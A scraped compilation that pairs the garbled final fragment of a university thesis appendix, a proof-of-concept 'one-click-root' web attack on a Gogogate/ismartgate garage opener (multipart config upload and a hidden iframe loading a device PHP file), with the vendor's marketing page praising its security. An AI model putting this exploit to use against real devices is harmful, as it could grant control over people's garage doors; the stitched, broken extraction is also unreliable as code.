" Content - D i s p o s i t i o n : form - data ; name =\ " upload - image \ "

\ r \ n " +

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door - form \ " \ r \

n " +

" \ r \ n " +
" edit - door \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " config - gogo -

u p d a t e \ " \ r \ n " +
" \ r \ n " +
" U p d a t e \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c - -\ r \ n " ;

128

APPENDIX E. POC FOR ONE-CLICK-ROOT

176

177

178

179

180

181

182

183

184

185

186

187

188

189

190

191

192

193

194

195

var aBody = new U i n t 8 A r r a y ( body . l e n g t h ) ;
for ( var i = 0; i < aBody . l e n g t h ; i ++)

aBody [ i ] = body . c h a r C o d e A t ( i ) ;

xhr . send ( new Blob ([ aBody ]) ) ;

};

s u b m i t R e q u e s t () ;

</ s c r i p t >

< i f r a m e id = " d e l a y F r a m e " width = " 1 " h e i g h t = " 1 " style = " d i s p l a y :
none ; " > </ i f r a m e >

< s c r i p t >

w i n d o w . o n l o a d = f u n c t i o n () {

s e t T i m e o u t ( f u n c t i o n () {

http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / isg / i m g _ d o o r s / i m g c l o s e 2 . php ';

d o c u m e n t . g e t E l e m e n t B y I d ( ' delayFrame ') . src = '

} , 5000) ;

};
</ s c r i p t >

Listing E.1: PoC for one-click-root attack

TRITA -EECS-EX-2020:435www.kth.se

=== Content from ismartgate.com_21dc8040_20250119_111817.html ===

 [Skip to content](#content)

[![Smart Garage Door Openers | Garage Door Remote Control by ismartgate](https://ismartgate.com/wp-content/uploads/2018/07/ismartgate_header_logo.gif)

![Smart Garage Door Openers | Garage Door Remote Control by ismartgate](https://ismartgate.com/wp-content/uploads/2018/07/ismartgate_header_logo.gif)](https://ismartgate.com/)

* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_openers.png "CAT_openers")Smart Openers
  + Products
    - [ismartgate MININEW](https://ismartgate.com/ismartgate-mini/)
    - [ismartgate LITE](https://ismartgate.com/ismartgate-lite/)
    - [ismartgate PRO](https://ismartgate.com/ismartgate-pro/)
    - [ismartgate Accessories](https://ismartgate.com/smart-garage-accessories/)
    - [Gogogate 2(DISCONTINUED)](https://ismartgate.com/gogogate-2/)
    - [Gogogate 1(DISCONTINUED)](https://ismartgate.com/gogogate-1/)
    - [Compare Openers](https://ismartgate.com/compare-ismartgate-smart-garage-openers/)
  + Features
    - [Garage Door Openers Features](https://ismartgate.com/homekit-garage-door/)
    - [Smart Home](https://ismartgate.com/connect-your-garage-door-opener-to-the-leading-automation-platforms/)
    - [Users](https://ismartgate.com/garage-access-users/)
    - [Video](https://ismartgate.com/garage-access-real-time-video/)
    - [Security & Privacy](https://ismartgate.com/secure-garage-door/)
    - [Support](https://ismartgate.com/install-smart-garage-door/)
    - [FAQ's](https://ismartgate.com/install-smart-garage-door/smart-garage-door-opener-frequently-asked-questions/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_Surveillance.png "CAT_Surveillance")Surveillance
  + Products
    - [ismartgate Cam INDOOR](https://ismartgate.com/smart-indoor-camera/)
    - [ismartgate Cam OUTDOOR](https://ismartgate.com/smart-outdoor-camera/)
    - [Compare Products](https://ismartgate.com/compare-ismartgate-surveillance-products/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* [BUY NOW](https://ismartgate.com/buy-smart-garage/)

* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_openers.png "CAT_openers")Smart Openers
  + Products
    - [ismartgate MININEW](https://ismartgate.com/ismartgate-mini/)
    - [ismartgate LITE](https://ismartgate.com/ismartgate-lite/)
    - [ismartgate PRO](https://ismartgate.com/ismartgate-pro/)
    - [ismartgate Accessories](https://ismartgate.com/smart-garage-accessories/)
    - [Gogogate 2(DISCONTINUED)](https://ismartgate.com/gogogate-2/)
    - [Gogogate 1(DISCONTINUED)](https://ismartgate.com/gogogate-1/)
    - [Compare Openers](https://ismartgate.com/compare-ismartgate-smart-garage-openers/)
  + Features
    - [Garage Door Openers Features](https://ismartgate.com/homekit-garage-door/)
    - [Smart Home](https://ismartgate.com/connect-your-garage-door-opener-to-the-leading-automation-platforms/)
    - [Users](https://ismartgate.com/garage-access-users/)
    - [Video](https://ismartgate.com/garage-access-real-time-video/)
    - [Security & Privacy](https://ismartgate.com/secure-garage-door/)
    - [Support](https://ismartgate.com/install-smart-garage-door/)
    - [FAQ's](https://ismartgate.com/install-smart-garage-door/smart-garage-door-opener-frequently-asked-questions/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_Surveillance.png "CAT_Surveillance")Surveillance
  + Products
    - [ismartgate Cam INDOOR](https://ismartgate.com/smart-indoor-camera/)
    - [ismartgate Cam OUTDOOR](https://ismartgate.com/smart-outdoor-camera/)
    - [Compare Products](https://ismartgate.com/compare-ismartgate-surveillance-products/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* [BUY NOW](https://ismartgate.com/buy-smart-garage/)

* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_openers.png "CAT_openers")Smart Openers
  + Products
    - [ismartgate MININEW](https://ismartgate.com/ismartgate-mini/)
    - [ismartgate LITE](https://ismartgate.com/ismartgate-lite/)
    - [ismartgate PRO](https://ismartgate.com/ismartgate-pro/)
    - [ismartgate Accessories](https://ismartgate.com/smart-garage-accessories/)
    - [Gogogate 2(DISCONTINUED)](https://ismartgate.com/gogogate-2/)
    - [Gogogate 1(DISCONTINUED)](https://ismartgate.com/gogogate-1/)
    - [Compare Openers](https://ismartgate.com/compare-ismartgate-smart-garage-openers/)
  + Features
    - [Garage Door Openers Features](https://ismartgate.com/homekit-garage-door/)
    - [Smart Home](https://ismartgate.com/connect-your-garage-door-opener-to-the-leading-automation-platforms/)
    - [Users](https://ismartgate.com/garage-access-users/)
    - [Video](https://ismartgate.com/garage-access-real-time-video/)
    - [Security & Privacy](https://ismartgate.com/secure-garage-door/)
    - [Support](https://ismartgate.com/install-smart-garage-door/)
    - [FAQ's](https://ismartgate.com/install-smart-garage-door/smart-garage-door-opener-frequently-asked-questions/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* ![](https://ismartgate.com/wp-content/uploads/2021/09/CAT_Surveillance.png "CAT_Surveillance")Surveillance
  + Products
    - [ismartgate Cam INDOOR](https://ismartgate.com/smart-indoor-camera/)
    - [ismartgate Cam OUTDOOR](https://ismartgate.com/smart-outdoor-camera/)
    - [Compare Products](https://ismartgate.com/compare-ismartgate-surveillance-products/)
  + ![](https://ismartgate.com/wp-content/uploads/2022/04/Find_the_best_smart_garage_for_my_home.jpg)

    **Which is the best opener for my home?**

    [Check it now!](https://ismartgate.com/simulator/)
* [BUY NOW](https://ismartgate.com/buy-smart-garage/)

The best secure smart garage door opener[jordi](https://ismartgate.com/author/jordi/ "Posts by jordi")2024-05-02T14:31:16+01:00
#### Smart Openers Features

* [Smart Home](https://ismartgate.com/homekit-garage-door/)
* [Users](https://ismartgate.com/garage-access-users/)
* [Video](https://ismartgate.com/garage-access-real-time-video/)
* [Security & Privacy](https://ismartgate.com/secure-garage-door/)
* [Support](https://ismartgate.com/install-smart-garage-door/)
* [FAQs](https://ismartgate.com/install-smart-garage-door/smart-garage-door-opener-frequently-asked-questions/)
* [Compare](https://ismartgate.com/compare-ismartgate-smart-garage-openers/)
* [Simulator](https://ismartgate.com/simulator/)

# The best secure smart garage opener

### Our unique technological architecture puts your privacy before the commercial use of your data.

### In other words, nobody but you can access to the list of users, admin settings, log of events or daily history.

# **The best secure smart garage opener.**

### Our unique technological architecture puts your privacy before the commercial use of your data.

### In other words, nobody but you can access to the list of users, admin settings, log of events or daily history.

![garage personal information icon](data:image/svg+xml... "The most secure smart garage door gadget")
## Your information is always stored locally.

### ismartgate acts as its own server. In other words, all information is stored locally.

### **No data is stored in the cloud.**

![secure privacy smart garage icon](data:image/svg+xml... "The only smart garage door device that protects your privacy")
## We do not monitor you.

### We can not access any information from the use or set up of the system. Therefore, we can not monitor you.

![ismartgate works even if internet is down icon](data:image/svg+xml... "Open your garage door or gate when internet is down")
## ismartgate works even if internet is down.

### One of the big risks of using a cloud based system is relying on a stable internet connection and a cloud system (which is subject to maintenance services or denial of service attacks). In conclusion, ismartgate works\* even if internet is down.

### \*Only locally, when connected to home Wi-Fi

## Your data is not shared with anybody. In other words, it's only accessible by you.

## Your data is not shared with anybody. In other words, it's only accessible by you.

![ismartgate secure data table](https://ismartgate.com/wp-content/uploads/2020/01/table_01.png "The most secure smart garage opener")![ismartgate logo](data:image/svg+xml... "The best homekit garage door opener")
### **Non-Cloud** **based** **Platform**

· All your data and configuration is stored inside your device. In conclusion, in your home.

· To connect you and your ismartgate device, we use relay servers. These relay servers simply acts as a data bridge, establishing the connection between you and your device. Above all, they do not store any data.

· Your data is not shared with any third company. We neither monitor nor process your interactions with the ismartgate device.

· If internet is down, your ismartgate device is still accesible via WLAN (when connected to home wifi). In conclusion, add more security to your garage with ismartgate.

· In the unlikely event one ismartgate is hacked, the rest are safe. In other words, this is best secure smart garage solution for your home.

![unsecure smart garage competitor table](https://ismartgate.com/wp-content/uploads/2020/01/table_02.png "The most secure garage door solution")
### **Traditional Cloud based platform**

· All your data is stored on the cloud (in a remote location). Cloud based platforms are subject to DDoS attacks and maintenance service which can compromise the normal operation of the system.

· Your data is shared with other companies for unknown purposes (For instance telemarketing).

· If internet is down, your garage door or gate is unaccessible.

· In the unlikely event the cloud platform is hacked, all devices and user data are exposed.

![Which iSmartgate garage door opener do I need?](https://ismartgate.com/wp-content/uploads/2022/04/which_is_the_best_smart_garage_for_my_home.jpg "Which iSmartgate garage door opener do I need?")
## Which ismartgate do I need?

Try our simulator and find the perfect ismartgate for your home.

[![Which iSmartgate gate opener do I need?](https://ismartgate.com/wp-content/uploads/2022/04/which_is_the_best_smart_garage_for_my_house.jpg)](https://ismartgate.com/matter-garage-door)
## Which ismartgate do I need?

[![](https://ismartgate.com/wp-content/uploads/2022/04/find_your_ismartgate_mobile.jpg)](https://ismartgate.com/matter-garage-door)

![ismartgate - best garage door opener](data:image/gif;base64...)

How many Garage Doors do you have?

0
1
2
3

![sectional garage door opener](data:image/gif;base64...)

DOOR 1 TYPE:

Sectional

![sectional garage door opener](data:image/gif;base64...)

DOOR 2 TYPE:

Sectional

![sectional garage door opener](data:image/gif;base64...)

DOOR 3 TYPE:

Sectional

Sensor type

![ismartgate garage door simulator, sensor type](data:image/gif;base64...)

Do you want wireless or wired sensor/s for your garage door/s?

Wireless Sensor
Wired Sensor

Is your opener Chamberlain, Liftmaster or Craftsman?

![ismartgate garage door simulator, security](data:image/gif;base64...)

Got a Chamberlain or LiftMaster Garage Door Opener with Security+2.0?

Check the color of the learn button on your garage opener. If it’s YELLOW your opener use Security+2.0 and you will need the ismartgate switch adaptor.

Door 1
No
Yes

Door 2
No
Yes

Door 3
No
Yes

Separation

![ismartgate garage door simulator, separate 3 doors](data:image/gif;base64...)

Are your Garage doors Connected?

If the garage have no separation walls are considered
"connected"

Yes
1 Separation
2 Separations

Live Video

![ismartgate garage door simulator, video](data:image/gif;base64...)

Want to see what's happening in your garage in real time?

Control your garage doors with live video in the app

Door 1
No
Yes

Door 2
No
Yes

Door 3
No
Yes

![ismartgate gate opener with camera](data:image/gif;base64...)

How many Gates do you have?

0
1
2
3

![](data:image/gif;base64...)

DOOR 1 TYPE:

Sliding Gate

![ismartgate simulator - gate sliding](data:image/gif;base64...)

DOOR 2 TYPE:

Sliding Gate

![ismartgate simulator - gate sliding](data:image/gif;base64...)

DOOR 3 TYPE:

Sliding Gate

Sensor type

![ismartgate simulator gate, sensor type](data:image/gif;base64...)

Do you want wireless or wired sensor/s for your garage door/s?

Wireless Sensor
Wired Sensor

Gate power outlet

![ismartgate simulator gate, power outlet](data:image/gif;base64...)

Do you have a 110V/220V outlet near your gate?

If you don't have a 110V/220V outlet near your gate, you will need a DC/DC power converter to power your ismartgate opener.

Yes
No

Separation

![ismartgate simulator gate separation 3 doors](data:image/gif;base64...)

Are your Gates Connected?

Less than 30 feet is considered "connected"

Yes
1 Separation
2 Separations

Live Video

![ismartgate garage door simulator, video](data:image/gif;base64...)

Want to see what's happening in your gate in real time?

Control your gates with live video in the app

Door 1
No
Yes

Door 2
No
Yes

Door 3
No
Yes

![SmartHome](data:image/gif;base64...)

I want the ismartgate to be compatible with:

![Click to select / deselect option of ismartgate smart garage door opener compatibility with](data:image/gif;base64...)

![Apple Homekit compatible with ismartgate garage door opener](data:image/gif;base64...)

![Amazon Alexa compatible smart garage door opener](data:image/gif;base64...)

![Google assistant compatible garage door opener](data:image/gif;base64...)

![SmartThings compatible smart garage door opener](data:image/gif;base64...)

![IFTTT compatible smart garage door opener](data:image/gif;base64...)

![None (not selected compatibility with Alexa, Apple HomeKit, Google assistant, SmartThings or IFTTT)](data:image/gif;base64...)

###### If your home doesn't match with these options, please send us an email to support@ismartgate.com

Get Result

FINAL RESULT

![SmartHome](data:image/gif;base64...)

Opener Compatible with:
![Apple Homekit](data:image/gif;base64...)
![Alexa](data:image/gif;base64...)
![Apple Homekit](data:image/gif;base64...)
![Apple Homekit](data:image/gif;base64...)
![Apple Homekit](data:image/gif;base64...)
![Alexa](data:image/gif;base64...)

![ismartgate - best garage door opener](data:image/gif;base64...)

Your selection for 0x GARAGE
DOORS:

Your selection for 0x GATES:

![](data:image/gif;base64...)

BUY ALL NOW:

[BUY NOW](/buy-smart-garage/)

#####

---

![](data:image/gif;base64...)

## Get your ismartgate

### Open, close and monitor your garage door or gate.

![](https://ismartgate.com/wp-content/uploads/2024/05/mini_device.png "mini_device")![](data:image/svg+xml... "mini_logo_mobile")
### It’s mini, but it’s powerful.

[Buy Now](/buy-smart-garage/)![ismartgate LITE smart garage opener](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_LITE_products.png "The best homekit smart garage opener for only 1 garage door or gate")![](data:image/svg+xml... "lite_sign")
## The perfect smart opener for 1 garage door/gate.

[Buy Now](/buy-smart-garage/)![ismartgate PRO smart garage opener](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_PRO_products.png "The best homekit smart garage opener for 3 garage doors or gates")![](data:image/svg+xml... "pro_sign")
## Complete control for up to 3 doors and gates.

[Buy Now](/buy-smart-garage/)
## Get your ismartgate today

### Open, close and monitor your garage door or gate.

![](https://ismartgate.com/wp-content/uploads/2024/05/mini_device.png "mini_device")![](https://ismartgate.com/wp-content/uploads/2024/05/mini_logo.png "mini_logo")
## It’s mini, but it’s powerful.

[Buy Now](/buy-smart-garage/)![ismartgate LITE smart garage opener](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_LITE_products.png "The best homekit smart garage opener for only 1 garage door or gate")![ismartgate LITE logo](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_LITE.png "The best homekit garage door opener for 1 garage door or gate")
## The perfect smart garage opener for 1 garage door or gate.

[Buy Now](/buy-smart-garage/)![ismartgate PRO smart garage opener](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_PRO_products.png "The best homekit smart garage opener for 3 garage doors or gates")![ismartgate pro logo](https://ismartgate.com/wp-content/uploads/2019/11/ismartgate_PRO.png "The best smart homekit smart garage opener for 3 garage doors or gates")
## Complete control for up to 3 garage doors or gates.

[Buy Now](/buy-smart-garage/)

#### ismartgate Openers

* [ismartgate MINI](https://ismartgate.com/ismartgate-mini/)
* [ismartgate LITE](https://ismartgate.com/ismartgate-lite/)
* [ismartgate PRO](https://ismartgate.com/ismartgate-pro/)
* [Gogogate 2](https://ismartgate.com/gogogate-2/)
* [Gogogate 1](https://ismartgate.com/gogogate-1/)

#### Support

* [Installation](https://setup.ismartgate.com/)
* [Simulator](/simulator/)
* [Garage compatibility wiring instructions](https://ismartgate.com/smart-garage-door-opener-compatibility-wiring-instructions/)
* [Gate compatibility wiring instructions](/compatibility-checker/)
* [Contact](/contact-us/)
* [FAQ's](https://ismartgate.com/install-smart-garage-door/smart-garage-door-opener-frequently-asked-questions/)
* [How to tell if you have 2.4 GHz or 5 GHz WiFi network](https://ismartgate.com/how-to-tell-if-you-have-2-4-ghz-or-5-ghz-wifi-network/)
* [Smart garage for old models](/smart-garage-door-opener-for-older-models/)
* [General Garage Door Topics](/garage-doors-and-gates-general-topics/)
* [Garage Door Opener Instructions Manuals](https://ismartgate.com/garage-openers-instructions-manual/)
* [Garage Door Opener Models with Security 2.0 Enabled](https://ismartgate.com/garage-door-opener-models-with-security2-0-enabled/)

#### INFORMATION

* [Terms and Conditions](/terms-and-conditions/)
* [Privacy](/privacy/)
* [Cookie Statement](/cookie-policy/)
* [Product Warranty & Return Policy](/warranty/)

#### News & Updates

* [Subscribe >](http://eepurl.com/beKKQT)
* [![](https://ismartgate.com/wp-content/uploads/2021/07/ismartgate_app_android_google_play-3.png)](https://play.google.com/store/apps/details?id=com.ismartgate.app)
* [![](https://ismartgate.com/wp-content/uploads/2021/07/ismartgate_app_ios_itunes-2.png)](https://apps.apple.com/us/app/ismartgate-access/id1277087476?ls=1)

Copyright Gogogate INC.

Page load link

![en_US](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/en_US.png "English")English

 [![es_ES](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/es_ES.png "Spanish")Spanish](https://ismartgate.com/es/puerta-de-garaje-segura/ "Spanish")
[![fr_FR](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/fr_FR.png "French")French](https://ismartgate.com/fr/porte-de-garage-securisee/ "French")
[![de_DE](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/de_DE.png "German")German](https://ismartgate.com/de/sicheres-garagentor/ "German")
[![nb_NO](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/nb_NO.png "Norwegian")Norwegian](https://ismartgate.com/nb/sikker-garasjeport/ "Norwegian")
[![sv_SE](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/sv_SE.png "Swedish")Swedish](https://ismartgate.com/sv/saker-garageport/ "Swedish")
[![nl_NL](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/nl_NL.png "Dutch")Dutch](https://ismartgate.com/nl/beveiligde-garagedeur/ "Dutch")
[![da_DK](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/da_DK.png "Danish")Danish](https://ismartgate.com/da/sikker-garageport/ "Danish")
[![it_IT](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/it_IT.png "Italian")Italian](https://ismartgate.com/it/porta-di-garage-sicura/ "Italian")
[![pl_PL](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/pl_PL.png "Polish")Polish](https://ismartgate.com/pl/bezpieczna-brama-garazowa/ "Polish")
[![tr_TR](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/tr_TR.png "Turkish")Turkish](https://ismartgate.com/tr/guvenli-garaj-kapisi/ "Turkish")
[![hu_HU](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/hu_HU.png "Hungarian")Hungarian](https://ismartgate.com/hu/biztonsagos-garazskapu/ "Hungarian")
[![fi](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/fi.png "Finnish")Finnish](https://ismartgate.com/fi/turvallinen-autotallin-ovi/ "Finnish")
[![el](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/el.png "Greek")Greek](https://ismartgate.com/el/%CE%B1%CF%83%CF%86%CE%B1%CE%BB%CE%AE%CF%82-%CF%80%CF%8C%CF%81%CF%84%CE%B1-%CE%B3%CE%BA%CE%B1%CF%81%CE%AC%CE%B6/ "Greek")
[![lv](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/lv.png "Latvian")Latvian](https://ismartgate.com/lv/drosas-garazas-durvis/ "Latvian")
[![et](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/et.png "Estonian")Estonian](https://ismartgate.com/et/turvaline-garaaziuks/ "Estonian")
[![pt_PT](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/pt_PT.png "Portuguese")Portuguese](https://ismartgate.com/pt/porta-de-garagem-segura/ "Portuguese")
![en_US](https://ismartgate.com/wp-content/plugins/translatepress-multilingual/assets/images/flags/en_US.png "English")English

This site uses cookies: [More info](https://ismartgate.com/cookie-policy/)Okay, thank you

Go to Top


